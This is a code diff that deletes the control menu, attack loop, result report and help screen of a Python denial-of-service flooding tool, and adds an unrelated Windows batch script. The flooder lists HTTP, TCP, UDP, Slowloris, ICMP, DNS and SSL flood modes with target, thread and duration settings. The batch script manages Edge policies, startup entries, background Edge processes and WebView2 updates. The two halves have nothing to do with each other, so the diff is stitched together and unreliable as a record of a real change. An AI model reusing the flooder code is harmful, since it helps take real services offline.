-        clear()
-        log_i(f"Launching {CFG.method} attack...")
-        print("=" * 60)
-        
-        vector = self.vector()
-        self.threads = vector.start()
-        
-        log_ok(f"Attack running with {len(self.threads)} threads")
-        print("=" * 60)
-        print(C.y("Press Ctrl+C to stop"))
-        print("=" * 60)
-        
-        try:
-            last_report = time.time()
-            
-            while vector.running:
-                now = time.time()
-                
-                if CFG.duration > 0:
-                    with CFG.lock:
-                        if now - CFG.start > CFG.duration:
-                            vector.stop()
-                            break
-                
-                if now - last_report >= 2:
-                    m = CFG.metrics()
-                    log_m(f"Active: {m['active']:,} | Packets: {m['packets']:,} | Bytes: {m['bytes']:,} | PPS: {m['pps']:.0f} | Mbps: {m['mbps']:.2f}")
-                    last_report = now
-                
-                time.sleep(0.05)
-        
-        except KeyboardInterrupt:
-            print("\n")
-            log_e("Interrupted")
-            vector.stop()
-        
-        log_i("Waiting for cleanup...")
-        vector.stop()
-        
-        for t in self.threads:
-            t.join(timeout=2)
-        
-        time.sleep(0.5)
-        self.report()
-    
-    def report(self):
-        clear()
-        print(C.g("=" * 60))
-        print(C.b("ATTACK COMPLETE"))
-        print(C.g("=" * 60))
-        
-        m = CFG.metrics()
-        
-        print(f"Type:        {C.c_(CFG.method)}")
-        print(f"Target:      {C.c_(CFG.ip + ':' + str(CFG.port))}")
-        print(f"Threads:     {C.c_(str(CFG.threads))}")
-        duration_f = f"{m['elapsed']:.2f}s"
-        print(f"Duration:    {C.c_(duration_f)}")
-        packets_f = f"{m['packets']:,}"
-        print(f"Packets:     {C.y(packets_f)}")
-        bytes_f = f"{m['bytes']:,}"
-        print(f"Bytes:       {C.y(bytes_f)}")
-        pps_f = f"{m['pps']:.0f}"
-        print(f"PPS:         {C.g(pps_f)}")
-        mbps_f = f"{m['mbps']:.2f}"
-        print(f"Mbps:        {C.g(mbps_f)}")
-        print(C.g("=" * 60))
-        
-        input("")
-    
-    def show_cfg(self):
-        clear()
-        print(C.c_("CURRENT SETTINGS"))
-        print("=" * 60)
-        print(f"Target:      {CFG.ip}:{CFG.port}")
-        print(f"Attack:      {CFG.method}")
-        print(f"Threads:     {CFG.threads}")
-        print(f"Duration:    {CFG.duration}s")
-        print(f"Batch:       {CFG.batch}")
-        print(f"Payload:     {CFG.payload_sz} bytes")
-        print("=" * 60)
-        input("")
-    
-    def adv_menu(self):
-        while True:
-            clear()
-            print(C.c_("ADVANCED SETTINGS"))
-            print("=" * 60)
-            print(f"1. Payload Size: {C.y(str(CFG.payload_sz))} bytes")
-            print(f"2. Batch Size: {C.y(str(CFG.batch))}")
-            print(f"3. Connection Timeout: {C.y(str(CFG.timeout))}s")
-            print(f"4. Socket Buffer: {C.y(str(CFG.buf_sz))} bytes")
-            print(f"5. Random Ports: {C.y('ON' if CFG.rand_ports else 'OFF')}")
-            print("0. Back")
-            print("=" * 60)
-            
-            choice = inp("Select: ")
-            
-            if choice == "1":
-                try:
-                    size = int(inp("Payload size (64-65535): ") or str(CFG.payload_sz))
-                    if 64 <= size <= 65535:
-                        CFG.payload_sz = size
-                        log_ok(f"Payload: {size} bytes")
-                    else:
-                        log_e("Must be 64-65535")
-                    input("")
-                except ValueError:
-                    log_e("Invalid")
-                    input("")
-            
-            elif choice == "2":
-                try:
-                    batch = int(inp("Batch size (100-10000): ") or str(CFG.batch))
-                    if 100 <= batch <= 10000:
-                        CFG.batch = batch
-                        log_ok(f"Batch: {batch}")
-                    else:
-                        log_e("Must be 100-10000")
-                    input("")
-                except ValueError:
-                    log_e("Invalid")
-                    input("")
-            
-            elif choice == "3":
-                try:
-                    timeout = int(inp("Timeout (1-30): ") or str(CFG.timeout))
-                    if 1 <= timeout <= 30:
-                        CFG.timeout = timeout
-                        log_ok(f"Timeout: {timeout}s")
-                    else:
-                        log_e("Must be 1-30")
-                    input("")
-                except ValueError:
-                    log_e("Invalid")
-                    input("")
-            
-            elif choice == "4":
-                try:
-                    buf = int(inp("Buffer size (1048576-268435456): ") or str(CFG.buf_sz))
-                    if 1048576 <= buf <= 268435456:
-                        CFG.buf_sz = buf
-                        log_ok(f"Buffer: {buf} bytes")
-                    else:
-                        log_e("Must be 1MB-256MB")
-                    input("")
-                except ValueError:
-                    log_e("Invalid")
-                    input("")
-            
-            elif choice == "5":
-                CFG.rand_ports = not CFG.rand_ports
-                log_ok(f"Random ports: {'ON' if CFG.rand_ports else 'OFF'}")
-                input("")
-            
-            elif choice == "0":
-                break
-            
-            else:
-                log_e("Invalid")
-                input("")
-    
-    def sysinfo(self):
-        clear()
-        print(C.c_("SYSTEM INFORMATION"))
-        print("=" * 60)
-        print(f"OS:       {platform.system()} {platform.release()}")
-        print(f"Python:   {platform.python_version()}")
-        print(f"Arch:     {platform.architecture()[0]}")
-        print(f"Proc:     {platform.processor() or 'Unknown'}")
-        print("=" * 60)
-        input("")
-    
-    def help(self):
-        clear()
-        print(C.c_("HELP & DOCUMENTATION"))
-        print("=" * 60)
-        print("\nATTACK TYPES:")
-        print("  HTTP Flood   - Layer 7 application attacks")
-        print("  TCP Flood    - Layer 4 connection exhaustion")
-        print("  UDP Flood    - Layer 4 volumetric (fastest)")
-        print("  Slowloris    - Keep connections alive")
-        print("  ICMP Flood   - Layer 3 ping flood")
-        print("  DNS Flood    - DNS query flood")
-        print("  SSL Flood    - TLS handshake attacks")
-        print("  Multi        - All vectors simultaneously")
-        print("\nSETTINGS:")
-        print("  Threads:     100-20000 (higher = more throughput)")
-        print("  Payload:     64-65535 bytes (larger = more bandwidth)")
-        print("  Batch:       100-10000 (packets per cycle)")
-        print("  Duration:    0=unlimited, or seconds")
-        print("\nKEYBOARDS:")
-        print("  Ctrl+C - Stop attack gracefully")
-        print("=" * 60)
-        input("")
+:pi_absent
+if /I not "%MODE%"=="apply" goto pi_missing
+call :polkey_note
+call :st_put "%ST_M%" "Policy.%~1" created
+if errorlevel 1 (
+    call :fail "%~1 not changed, original state could not be recorded"
+    exit /b 0
+)
+reg add "%P_EDGE%" /v %~1 /t REG_DWORD /d 0 /f >nul 2>&1
+call :reg_get "%P_EDGE%" %~1 PV
+if /I "%RG_T%"=="REG_DWORD" if "%PV%"=="0x0" (
+    call :done "%~1 set to 0"
+    exit /b 0
+)
+call :st_del "%ST_M%" "Policy.%~1"
+call :fail "%~1 could not be set"
+exit /b 0
 
-# ============================================================================
-# MAIN
-# ============================================================================
+:pi_missing
+call :warn "%~1 not configured, Edge default applies"
+set /a NC+=1
+exit /b 0
 
-def cleanup():
-    """Cleanup on exit"""
-    try:
-        CFG.stop()
-    except:
-        pass
+:inspect_policies
+for %%N in (%POLICIES%) do call :policy_item %%N
+exit /b 0
 
-def main():
-    atexit.register(cleanup)
-    
-    try:
-        menu = Menu()
-        menu.main()
-    except KeyboardInterrupt:
-        print("\n")
-        log_e("Exiting...")
-        sys.exit(0)
-    except Exception as e:
-        log_e(f"Fatal: {str(e)}")
-        import traceback
-        traceback.print_exc()
-        sys.exit(1)
+:: polkey_note   remember that this tool is about to create the policy key,
+:: so Restore may remove it again when it is empty
+:polkey_note
+reg query "%P_EDGE%" >nul 2>&1
+if not errorlevel 1 exit /b 0
+call :st_put "%ST_M%" "PolicyKey.Edge" created
+exit /b 0
 
-if __name__ == "__main__":
-    main()
+:: Startup entries: Run value MicrosoftEdgeAutoLaunch* is considered
+:: compliant when its StartupApproved flag says disabled.
+:inspect_startup
+set "SU_ANY="
+call :scope U "%RUN_U%" "%APPR_U%"
+call :scope M "%RUN_M%" "%APPR_M%"
+call :scope M32 "%RUN_M32%" "%APPR_M32%"
+if not defined SU_ANY call :ok "No Edge auto-launch entry in the Run keys"
+exit /b 0
+
+:scope
+if /I "%~1"=="U" if not defined HKCU_OK (
+    call :skip "Per-user startup entries skipped, elevated account differs from yours"
+    exit /b 0
+)
+set "SCOPE=%~1"
+set "SCOPE_APPR=%~3"
+call :each_run "%~2" startup_item
+exit /b 0
+
+:startup_item
+set "SU_ANY=1"
+set "SI_N=%~2"
+call :reg_get "%SCOPE_APPR%" "%SI_N%" AD
+set "SI_ORIG=absent"
+if defined AD set "SI_ORIG=%AD%"
+call :is_off "%AD%"
+if not errorlevel 1 goto si_off
+if /I not "%MODE%"=="apply" goto si_on
+set "SKEY=%ST_M%"
+if /I "%SCOPE%"=="U" set "SKEY=%ST_U%"
+call :st_put "%SKEY%" "Appr.%SCOPE%.%SI_N%" "%SI_ORIG%"
+if errorlevel 1 (
+    call :fail "%SI_N% not changed, original state could not be recorded"
+    exit /b 0
+)
+reg add "%SCOPE_APPR%" /v "%SI_N%" /t REG_BINARY /d %APPR_OFF% /f >nul 2>&1
+call :reg_get "%SCOPE_APPR%" "%SI_N%" AD
+call :is_off "%AD%"
+if not errorlevel 1 (
+    call :done "%SI_N% switched off in Startup settings"
+    exit /b 0
+)
+call :st_del "%SKEY%" "Appr.%SCOPE%.%SI_N%"
+call :fail "%SI_N% could not be switched off"
+exit /b 0
+
+:si_off
+call :ok "%SI_N% is disabled in Startup settings"
+exit /b 0
+
+:si_on
+call :warn "%SI_N% starts at sign-in"
+set /a NC+=1
+exit /b 0
+
+:: ----- Edge browser processes (main browser processes only) -----
+:: edge_procs sets EP_OK, EP_TOTAL, EP_ROOT, EP_WIN, EP_BG, EP_WV2.
+:: A process counts as Edge browser only when its executable is
+:: ...\Microsoft\Edge\Application\msedge.exe. WebView2 uses
+:: msedgewebview2.exe from a different folder and is only counted.
+:edge_procs
+set "EP_OK="
+set "EP_TOTAL=0"
+set "EP_ROOT=0"
+set "EP_WIN=0"
+set "EP_WV2=0"
+for /f "usebackq tokens=1,2,3,4 delims=|" %%A in (`powershell.exe -NoProfile -NonInteractive -Command "$a=@(Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'msedge.exe' -and $_.ExecutablePath -like '*\Microsoft\Edge\Application\msedge.exe' }); $r=@($a | Where-Object { $_.CommandLine -notlike '*--type=*' }); $w=@($r | Where-Object { (Get-Process -Id $_.ProcessId -ErrorAction SilentlyContinue).MainWindowHandle -ne 0 }); $v=@(Get-Process -Name msedgewebview2 -ErrorAction SilentlyContinue); '' + $a.Count + '|' + $r.Count + '|' + $w.Count + '|' + $v.Count" 2^>nul`) do (
+    set "EP_TOTAL=%%A"
+    set "EP_ROOT=%%B"
+    set "EP_WIN=%%C"
+    set "EP_WV2=%%D"
+    set "EP_OK=1"
+)
+set /a EP_BG=EP_ROOT-EP_WIN
+exit /b 0
+
+:: close_edge_bg   ends main Edge browser processes that have NO window,
+:: together with their own child processes. Windowed Edge is never touched.
+:close_edge_bg
+powershell.exe -NoProfile -NonInteractive -Command "$a=@(Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'msedge.exe' -and $_.ExecutablePath -like '*\Microsoft\Edge\Application\msedge.exe' -and $_.CommandLine -notlike '*--type=*' }); foreach ($p in $a) { $g=Get-Process -Id $p.ProcessId -ErrorAction SilentlyContinue; if ($g -and $g.MainWindowHandle -eq 0) { $i=[string]$p.ProcessId; & taskkill.exe /PID $i /T /F | Out-Null } }" >nul 2>&1
+exit /b 0
+
+:proc_report
+call :edge_procs
+if not defined EP_OK (
+    call :info "Edge processes: unavailable, PowerShell could not be queried"
+    set /a UNV+=1
+    exit /b 0
+)
+if %EP_TOTAL% EQU 0 (
+    call :ok "No Edge browser process is running"
+) else (
+    call :info "Edge browser processes: %EP_TOTAL% total, %EP_WIN% with a window, %EP_BG% in background"
+)
+call :info "WebView2 processes: %EP_WV2%, not Edge browser, never touched"
+exit /b 0
+
+:proc_apply
+call :edge_procs
+if not defined EP_OK (
+    call :skip "Edge process check unavailable, restart Edge to apply the policies"
+    exit /b 0
+)
+if %EP_TOTAL% EQU 0 (
+    call :ok "No Edge browser process is running"
+    exit /b 0
+)
+if %EP_WIN% GTR 0 call :info "Edge has open windows, left running, policies apply after Edge restarts"
+if %EP_BG% LEQ 0 exit /b 0
+if defined SILENT (
+    call :info "Background Edge processes: %EP_BG%, they end when Edge restarts or you sign out"
+    exit /b 0
+)
+echo.
+choice /c YN /n /m "    Close background Edge processes now? [Y/N] "
+if errorlevel 2 (
+    call :info "Left running, they end when Edge restarts or you sign out"
+    exit /b 0
+)
+call :close_edge_bg
+call :edge_procs
+if %EP_BG% LEQ 0 (
+    call :ok "Background Edge processes closed"
+) else (
+    call :warn "Background Edge processes still running: %EP_BG%"
+)
+exit /b 0
+
+:: ======================================================================
+:: STATUS  (read-only)
+:: ======================================================================
+:do_status
+set "MODE=status"
+call :title "Edge isolation status"
+call :head "Edge browser policies"
+call :inspect_policies
+call :head "Startup entries"
+call :inspect_startup
+call :head "Edge processes"
+call :proc_report
+call :head "Shared update components, not modified by this tool"
+call :infra_report
+call :head "WebView2 Runtime, preserved"
+call :wv2_report
+if %NC% EQU 0 (
+    call :result ok "Compliant: Edge browser isolation is in place"
+) else (
+    call :result warn "Items not compliant: %NC%, run Apply"
+    call :setrc 1
+)
+exit /b 0
+
+:infra_report
+for %%S in (%UPDATE_SVCS%) do call :svc_info %%S
+set "TK="
+for /f "usebackq tokens=1,3 delims=," %%A in (`schtasks /query /fo csv /nh 2^>nul ^| find /I "MicrosoftEdgeUpdate"`) do call :task_line "%%~A" "%%~B"
+if not defined TK call :info "No Edge Update scheduled task found"
+exit /b 0
+
+:svc_info
+call :read_start %~1
+if not defined ST (
+    call :info "%~1: not installed"
+    exit /b 0
+)
+call :start_name %ST%
+set "RUNSTATE=stopped"
+sc query %~1 2>nul | find "RUNNING" >nul
+if not errorlevel 1 set "RUNSTATE=running"
+if "%ST%"=="0x4" (
+    call :warn "%~1: Disabled, not by this tool, Edge and WebView2 servicing may be affected"
+) else (
+    call :info "%~1: %SNAME%, %RUNSTATE%, left unchanged"
+)
+exit /b 0
+
+:task_line
+set "TK=1"
+if /I "%~2"=="Disabled" (
+    call :warn "Task %~1: Disabled, not by this tool, Edge and WebView2 servicing may be affected"
+) else (
+    call :info "Task %~1: %~2, left unchanged"
+)
+exit /b 0
+
+:wv2_report
+call :read_both
+if "%WV2_V%"=="not found" (
+    call :warn "WebView2 Runtime not found in the registry"
+    set /a UNV+=1
+) else (
+    call :ok "WebView2 Runtime %WV2_V% installed, never changed by this tool"
+)
+call :info "Edge browser version: %EDGE_V%"
+exit /b 0
+
+:: ======================================================================
+:: RESTORE  (uses only the state recorded by Apply)
+:: ======================================================================
+:do_restore
+set "RS_ANY="
+call :restore_hive "%ST_M%"
+if defined HKCU_OK (
+    call :restore_hive "%ST_U%"
+) else (
+    call :skip "Per-user records skipped, elevated account differs from yours"
+)
+if not defined RS_ANY call :info "Nothing recorded, this tool has no change to undo"
+call :info "Changes made by older versions of this tool were never recorded and are not touched"
+if %FAILS% GTR 0 call :setrc 1
+exit /b 0
+
+:restore_hive
+for /f "tokens=1,3" %%N in ('reg query "%~1" 2^>nul ^| find "REG_SZ"') do call :restore_one "%~1" "%%N" "%%O"
+call :restore_polkey "%~1"
+call :st_cleanup "%~1"
+exit /b 0
+
+:: restore_polkey <state key>   runs after the values are restored
+:restore_polkey
+call :reg_get "%~1" "PolicyKey.Edge" PK
+if not defined PK exit /b 0
+call :key_empty "%P_EDGE%"
+if errorlevel 1 goto rk_clear
+reg delete "%P_EDGE%" /f >nul 2>&1
+call :key_empty "%P_EDGE%"
+if not errorlevel 1 (
+    call :fail "Edge policy key could not be removed"
+    exit /b 0
+)
+call :done "Edge policy key removed, this tool created it and it is empty"
+:rk_clear
+call :st_del "%~1" "PolicyKey.Edge"
+exit /b 0
+
+:: key_empty <key>   0 only when the key exists and holds no values or subkeys
+:key_empty
+reg query "%~1" >nul 2>&1
+if errorlevel 1 exit /b 1
+set /a KE=0
+for /f "delims=" %%L in ('reg query "%~1" 2^>nul') do set /a KE+=1
+if %KE% LEQ 1 exit /b 0
+exit /b 1
+
+:restore_one
+set "RS_ANY=1"
+set "R_KIND="
+for /f "tokens=1,2,* delims=." %%a in ("%~2") do (
+    set "R_KIND=%%a"
+    set "R_P2=%%b"
+    set "R_P3=%%c"
+)
+if /I "%R_KIND%"=="Policy" call :restore_policy "%R_P2%" "%~1"
+if /I "%R_KIND%"=="Appr" call :restore_appr "%R_P2%" "%R_P3%" "%~1" "%~3"
+exit /b 0
+
+:: restore_policy <name> <state key>
+:restore_policy
+call :reg_get "%P_EDGE%" %~1 PV
+if not defined PV goto rp_gone
+if not "%PV%"=="0x0" goto rp_changed
+reg delete "%P_EDGE%" /v %~1 /f >nul 2>&1
+call :reg_get "%P_EDGE%" %~1 PV
+if defined PV (
+    call :fail "%~1 could not be removed"
+    exit /b 0
+)
+call :done "%~1 removed, policy back to not configured"
+goto rp_clear
+:rp_gone
+call :info "%~1 was already removed"
+goto rp_clear
+:rp_changed
+call :skip "%~1 is now %PV%, changed after this tool set it, left as is"
+:rp_clear
+call :st_del "%~2" "Policy.%~1"
+exit /b 0
+
+:: restore_appr <scope> <name> <state key> <original data or absent>
+:restore_appr
+set "RA_KEY=%APPR_M%"
+if /I "%~1"=="U" set "RA_KEY=%APPR_U%"
+if /I "%~1"=="M32" set "RA_KEY=%APPR_M32%"
+call :reg_get "%RA_KEY%" "%~2" AD
+if not defined AD goto ra_gone
+if /I not "%AD%"=="%APPR_OFF%" goto ra_changed
+if /I "%~4"=="absent" (
+    reg delete "%RA_KEY%" /v "%~2" /f >nul 2>&1
+) else (
+    reg add "%RA_KEY%" /v "%~2" /t REG_BINARY /d %~4 /f >nul 2>&1
+)
+call :reg_get "%RA_KEY%" "%~2" AD
+set "RA_OK="
+if /I "%~4"=="absent" (
+    if not defined AD set "RA_OK=1"
+) else (
+    if /I "%AD%"=="%~4" set "RA_OK=1"
+)
+if not defined RA_OK (
+    call :fail "%~2 could not be restored"
+    exit /b 0
+)
+call :done "%~2 restored to its original Startup setting"
+goto ra_clear
+:ra_gone
+call :info "%~2 Startup record no longer exists"
+goto ra_clear
+:ra_changed
+call :skip "%~2 was changed after this tool disabled it, left as is"
+:ra_clear
+call :st_del "%~3" "Appr.%~1.%~2"
+exit /b 0
+
+:: ======================================================================
+:: WEBVIEW2 UPDATE (winget). The Edge browser is never updated here.
+:: ======================================================================
+:do_check
+call :need_winget
+if errorlevel 1 exit /b 0
+call :read_both
+if "%WV2_V%"=="not found" (
+    call :skip "WebView2 Runtime is not installed, nothing to check"
+    exit /b 0
+)
+call :wg_exec "upgrade --source winget --accept-source-agreements"
+if defined WG_HIT (
+    call :warn "WebView2 Runtime update available, installed %WV2_V%, use Update"
+    call :setrc 10
+    exit /b 0
+)
+if not defined WG_EC set "WG_EC=unknown"
+call :in_list "%WG_EC%" "0 -1978335212 -1978335189"
+if errorlevel 1 (
+    call :warn "Update status could not be determined, winget code %WG_EC%"
+    call :setrc 3
+) else (
+    call :ok "No WebView2 Runtime update listed, installed %WV2_V%"
+)
+exit /b 0
+
+:do_update
+call :need_winget
+if errorlevel 1 exit /b 0
+call :read_both
+if "%WV2_V%"=="not found" (
+    call :skip "WebView2 Runtime is not installed, nothing to update"
+    exit /b 0
+)
+set "WV2_B=%WV2_V%"
+call :info "Updating WebView2 Runtime %WV2_B% with winget"
+call :wg_exec "upgrade --id %WV2_ID% --exact --source winget --silent --accept-source-agreements --accept-package-agreements"
+call :read_both
+if not defined WG_EC (
+    call :fail "winget did not report a result"
+    call :setrc 3
+    exit /b 0
+)
+call :in_list "%WG_EC%" "0 -1978334967 -1978334966"
+if not errorlevel 1 goto up_success
+call :in_list "%WG_EC%" "-1978335189 -1978335153"
+if not errorlevel 1 goto up_current
+if "%WG_EC%"=="-1978335212" (
+    call :fail "winget does not list WebView2 Runtime as installed, update it another way"
+    call :setrc 3
+    exit /b 0
+)
+if "%WG_EC%"=="-1978335090" (
+    call :fail "winget cannot upgrade in place, install technology differs, reinstall manually"
+    call :setrc 3
+    exit /b 0
+)
+call :fail "winget failed, code %WG_EC%, run: winget upgrade --id %WV2_ID%"
+call :setrc 3
+exit /b 0
+
+:up_success
+if "%WG_EC%"=="-1978334967" call :info "winget says a restart is needed to finish"
+if "%WG_EC%"=="-1978334966" call :info "winget says a restart is needed to finish"
+if /I "%WV2_V%"=="%WV2_B%" (
+    call :warn "winget reported success but the version is unchanged, %WV2_V%, not verified"
+    call :setrc 3
+    exit /b 0
+)
+call :ok "WebView2 Runtime updated %WV2_B% to %WV2_V%, verified in registry"
+set /a NC=0
+set "QUIET=1"
+set "MODE=audit"
+call :inspect_policies
+call :inspect_startup
+set "QUIET="
+if %NC% EQU 0 (
+    call :info "Edge isolation unaffected, no need to run Apply again"
+) else (
+    call :warn "Isolation not fully in place: %NC% items, run Apply"
+)
+exit /b 0
+
+:up_current
+if /I "%WV2_V%"=="%WV2_B%" (
+    call :ok "WebView2 Runtime is up to date, %WV2_V%"
+) else (
+    call :ok "WebView2 Runtime now %WV2_V%, was %WV2_B%"
+)
+exit /b 0
+
+:need_winget
+winget --version >nul 2>&1
+if not errorlevel 1 exit /b 0
+call :fail "winget not found or not working, install App Installer from the Microsoft Store"
+call :setrc 2
+exit /b 1
+
+:: wg_exec "<winget arguments>"   sets WG_EC (exit code) and WG_HIT (a line
+:: mentioning WebView2 was listed). Raw winget output is not shown.
+:wg_exec
+set "WG_EC="
+set "WG_HIT="
+for /f "delims=" %%L in ('cmd /v:on /c "winget %~1 2>&1 & echo EC:!errorlevel!" ^| findstr /I /C:"EdgeWebView2" /C:"EC:"') do call :wg_line "%%L"
+exit /b 0
+
+:wg_line
+set "WL=%~1"
+if /I "%WL:~0,3%"=="EC:" (
+    call :wg_ec "%WL:~3%"
+) else (
+    set "WG_HIT=1"
+)
+exit /b 0
+
+:: wg_ec "<text after EC:>"   first word only, so stray spaces cannot matter
+:wg_ec
+for /f "tokens=1" %%E in ("%~1") do set "WG_EC=%%E"
+exit /b 0
+
+:: in_list <value> "<space separated list>"   returns 0 when found
+:in_list
+set "IL_V=%~1"
+for %%X in (%~2) do if "%%X"=="%IL_V%" exit /b 0
+exit /b 1
+
+:: ======================================================================
+:: SHARED HELPERS
+:: ======================================================================
+:reset
+set /a CHG=0
+set /a FAILS=0
+set /a NC=0
+set /a UNV=0
+set "RC=0"
+set "QUIET="
+set "MODE="
+exit /b 0
+
+:parse_arg
+set "A=%~1"
+if /I "%A%"=="/silent" (
+    set "SILENT=1"
+) else if /I "%A%"=="/plain" (
+    set "PLAIN=1"
+) else if /I "%A%"=="/elevated" (
+    set "ELEV=1"
+) else if /I "%A:~0,5%"=="/sid:" (
+    set "SID_ORIG=%A:~5%"
+) else (
+    set "ACTION=%A%"
+)
+exit /b 0
+
+:setrc
+if "%RC%"=="0" set "RC=%~1"
+exit /b 0
+
+:: get_sid <variable>   SID of the current account, empty if unavailable
+:get_sid
+set "%~1="
+for /f "tokens=2 delims=," %%S in ('whoami /user /fo csv /nh 2^>nul') do set "%~1=%%~S"
+exit /b 0
+
+:: reg_get <key> <value name> <out variable>   data in the variable, type in RG_T
+:reg_get
+set "%~3="
+set "RG_T="
+for /f "tokens=2,3" %%A in ('reg query "%~1" /v "%~2" 2^>nul ^| find /I "%~2"') do (
+    set "RG_T=%%A"
+    set "%~3=%%B"
+)
+exit /b 0
+
+:: each_run <Run key> <handler>   calls :handler "<key>" "<name>"
+:each_run
+for /f "tokens=1" %%N in ('reg query "%~1" 2^>nul ^| find /I "MicrosoftEdgeAutoLaunch"') do call :%~2 "%~1" "%%N"
+exit /b 0
+
+:: is_off <hex data>   0 when the StartupApproved flag says disabled (03/07)
+:is_off
+set "D=%~1"
+if not defined D exit /b 1
+if "%D:~0,2%"=="03" exit /b 0
+if "%D:~0,2%"=="07" exit /b 0
+exit /b 1
+
+:: recorded state: st_put <key> <name> <data> / st_del <key> <name>
+:st_put
+reg add "%~1" /v "%~2" /t REG_SZ /d "%~3" /f >nul 2>&1
+exit /b %errorlevel%
+
+:st_del
+reg delete "%~1" /v "%~2" /f >nul 2>&1
+exit /b 0
+
+:: st_cleanup <key>   removes the state key once it holds no values
+:st_cleanup
+reg query "%~1" >nul 2>&1
+if errorlevel 1 exit /b 0
+reg query "%~1" 2>nul | find "REG_SZ" >nul
+if not errorlevel 1 exit /b 0
+reg delete "%~1" /f >nul 2>&1
+exit /b 0
+
+:read_start
+call :reg_get "%SVC_ROOT%\%~1" Start ST
+exit /b 0
+
+:start_name
+set "SNAME=code %~1"
+if "%~1"=="0x2" set "SNAME=Automatic"
+if "%~1"=="0x3" set "SNAME=Manual"
+if "%~1"=="0x4" set "SNAME=Disabled"
+exit /b 0
+
+:: read_both   EDGE_V and WV2_V from the Edge Update registration
+:read_both
+call :read_ver EDGE_V %GUID_EDGE%
+call :read_ver WV2_V %GUID_WV2%
+if not defined EDGE_V set "EDGE_V=not found"
+if not defined WV2_V set "WV2_V=not found"
+exit /b 0
+
+:read_ver
+set "%~1="
+call :ver_try %~1 "HKLM\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\%~2"
+if not defined %~1 call :ver_try %~1 "HKLM\SOFTWARE\Microsoft\EdgeUpdate\Clients\%~2"
+if not defined %~1 call :ver_try %~1 "HKCU\SOFTWARE\Microsoft\EdgeUpdate\Clients\%~2"
+exit /b 0
+
+:ver_try
+call :reg_get %2 pv PV_TMP
+if not defined PV_TMP exit /b 0
+if "%PV_TMP%"=="0.0.0.0" exit /b 0
+set "%~1=%PV_TMP%"
+exit /b 0
+
+:: ----------------------------- CONSOLE UI -----------------------------
+:: Colors are cosmetic only: no command, result or exit code depends on
+:: them. Plain text is used for /silent, /plain and when NO_COLOR is set.
+:: When redirecting output to a file, add /plain.
+:ui_init
+set "ESC="
+set "C_CY="
+set "C_W="
+set "C_GN="
+set "C_YL="
+set "C_RD="
+set "C_GY="
+set "C_R="
+if defined SILENT exit /b 0
+if defined PLAIN exit /b 0
+if defined NO_COLOR exit /b 0
+set "OSV="
+set "OSB="
+for /f "delims=" %%V in ('ver') do set "OSV=%%V"
+if not defined OSV exit /b 0
+set "OSV=%OSV:[= %"
+set "OSV=%OSV:]= %"
+for %%T in (%OSV%) do call :ui_build "%%~T"
+if not defined OSB exit /b 0
+if %OSB% LSS 18362 exit /b 0
+for /f %%E in ('echo prompt $E ^| cmd') do set "ESC=%%E"
+if not defined ESC exit /b 0
+set "C_CY=%ESC%[96m"
+set "C_W=%ESC%[97m"
+set "C_GN=%ESC%[92m"
+set "C_YL=%ESC%[93m"
+set "C_RD=%ESC%[91m"
+set "C_GY=%ESC%[90m"
+set "C_R=%ESC%[0m"
+exit /b 0
+
+:ui_build
+for /f "tokens=1-3 delims=." %%a in ("%~1") do if "%%a.%%b"=="10.0" set "OSB=%%c"
+exit /b 0
+
+:: panel <action label>   one screen per action in menu mode
+:panel
+set "NOWAIT="
+call :clear
+call :%~1
+if /I not "%~1"=="act_status" if /I not "%~1"=="act_check" set "STATE_DIRTY=1"
+if not defined NOWAIT call :wait_key "Press any key to return to the menu..."
+exit /b 0
+
+:: clear   clears the screen once per screen change, only in the interactive menu
+:clear
+if not defined MENUMODE exit /b 0
+if defined PLAIN exit /b 0
+cls
+exit /b 0
+
+:: wait_key "<text>"   the only pause: lets you read a result screen
+:wait_key
+if defined SILENT exit /b 0
+echo.
+<nul set /p "=  %C_GY%%~1%C_R%"
+pause >nul
+echo.
+exit /b 0
+
+:: menu_state   one line from a quick registry-only check, no PowerShell
+:menu_state
+if defined STATE_TXT if not defined STATE_DIRTY goto ms_show
+set /a NC=0
+set "QUIET=1"
+set "MODE=audit"
+call :inspect_policies
+call :inspect_startup
+set "QUIET="
+set "STATE_DIRTY="
+if %NC% EQU 0 (
+    set "STATE_TXT=%C_GN%applied%C_R%"
+) else (
+    set "STATE_TXT=%C_YL%not fully applied, items: %NC%%C_R%"
+)
+:ms_show
+echo   %C_GY%Isolation:%C_R%  %STATE_TXT%
+exit /b 0
+
+:title
+if defined SILENT exit /b 0
+if defined QUIET exit /b 0
+echo.
+echo   %C_CY%%~1%C_R%
+echo   %C_GY%--------------------------------------------------------%C_R%
+exit /b 0
+
+:head
+if defined SILENT exit /b 0
+if defined QUIET exit /b 0
+echo.
+echo   %C_CY%%~1%C_R%
+exit /b 0
+
+:note
+if defined SILENT exit /b 0
+if not defined QUIET echo   %C_GY%%~1%C_R%
+exit /b 0
+
+:: result <ok|warn|fail> "<text>"   closing line of a screen, set apart by a blank line
+:result
+if defined QUIET exit /b 0
+set "RCOL=%C_GN%"
+if /I "%~1"=="warn" set "RCOL=%C_YL%"
+if /I "%~1"=="fail" set "RCOL=%C_RD%"
+if not defined SILENT echo.
+echo   %RCOL%%~2%C_R%
+exit /b 0
+
+:ok
+if not defined QUIET echo     %C_GN%[ ok ]%C_R% %C_W%%~1%C_R%
+exit /b 0
+
+:done
+set /a CHG+=1
+if not defined QUIET echo     %C_GN%[done]%C_R% %C_W%%~1%C_R%
+exit /b 0
+
+:skip
+if not defined QUIET echo     %C_YL%[skip]%C_R% %C_W%%~1%C_R%
+exit /b 0
+
+:warn
+if not defined QUIET echo     %C_YL%[warn]%C_R% %C_W%%~1%C_R%
+exit /b 0
+
+:fail
+set /a FAILS+=1
+if not defined QUIET echo     %C_RD%[FAIL]%C_R% %C_W%%~1%C_R%
+exit /b 0
+
+:info
+if not defined QUIET echo     %C_GY%[info]%C_R% %C_GY%%~1%C_R%
+exit /b 0
